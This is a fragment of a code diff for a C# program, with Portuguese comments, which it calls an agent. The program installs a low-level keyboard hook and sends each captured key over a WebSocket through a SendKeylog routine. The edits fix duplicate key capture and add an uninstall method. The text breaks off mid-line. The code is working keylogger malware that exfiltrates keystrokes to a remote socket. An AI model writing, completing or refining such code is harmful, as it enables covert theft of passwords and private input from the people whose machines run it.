@@ -40,7 +40,6 @@ internal static class Program
 
         Console.WriteLine($"[INFO] Iniciando Agente... ID: {agentId}");
 
-        // Instalando o Hook com o filtro de mensagens corrigido internamente
         KeyboardHook.Install(async (k, d) => {
             if (state.Socket?.State == WebSocketState.Open) {
                 await SendKeylog(state.Socket, sendGate, k, d);
@@ -277,17 +276,19 @@ public class KeyboardHook {
     }
 
     private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-        // CORREÇÃO: Só processa se for o evento de tecla pressionada (Down)
-        // Isso evita capturar o evento de tecla solta (Up), que causava a duplicidade.
+        // Filtra apenas para o evento de tecla pressionada (Down)
         if (n == WM_KEYDOWN || n == WM_SYSKEYDOWN) {
             if (_cb != null) {
                 int vkCode = Marshal.ReadInt32(l);
                 string key = ((Keys)vkCode).ToString();
-                
-                // Executa de forma assíncrona para não travar a thread do sistema
                 _ = Task.Run(async () => {
                     try { await _cb(key, true); } catch { }
                 });
             }
         }
-        return CallNextHookEx(_h, n, w
+        return CallNextHookEx(_h, n, w, l);
+    }
+
+    public static void Uninstall() {
+        if (_h != IntPtr.Zero) {
+            
